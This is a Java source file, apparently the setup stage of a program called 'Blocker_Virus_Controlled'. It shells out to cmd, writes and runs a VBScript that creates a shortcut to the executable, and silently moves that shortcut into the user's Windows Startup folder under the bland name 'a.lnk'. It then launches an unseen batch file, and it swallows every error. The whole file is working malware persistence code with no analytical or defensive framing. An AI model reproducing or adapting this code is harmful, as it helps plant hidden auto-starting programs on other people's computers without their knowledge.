import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

class SETUP {
    public static void main(String[] args) {
        try {
            Runtime.getRuntime().exec("cmd /c echo %appdata%>r.txt");
            File f1 = new File("r.txt");
            File f2 = new File("E:/loc.txt");
            while (!f1.renameTo(f2)) ;
            BufferedReader br;
            String loc = "";
            try {
                br = new BufferedReader(new FileReader(new File("E:/loc.txt")));
                loc = br.readLine();
                br.close();
                new File("E:/loc.txt").delete();
            } catch (Exception e) {
            }
            String lo2 = System.getProperty("user.dir");
            try {
                File vb = new File("s.vbs");
                vb.delete();
                vb = new File("s.vbs");
                vb.createNewFile();
                FileWriter f = new FileWriter(vb);
                f.write("set ows=WScript.CreateObject(\"WScript.Shell\")\nslf=\"Blocker_Virus_Controlled - Shortcut.lnk\"\nset ol=ows.Createshortcut(slf)\nol.targetpath=\"" + lo2 + "\\Blocker_Virus_Controlled.exe\"\nol.save");
                f.close();
            } catch (Exception e) {
            }
            Runtime.getRuntime().exec("cmd /c start s.vbs");
            while (!new File(lo2 + "/Blocker_Virus_Controlled - Shortcut.lnk").renameTo(new File(loc + "/Microsoft/Windows/Start Menu/Programs/Startup/a.lnk")))
                ;
            Runtime.getRuntime().exec("cmd /c start d.bat");
        } catch (Exception e) {
        }
        System.exit(0);
    }
}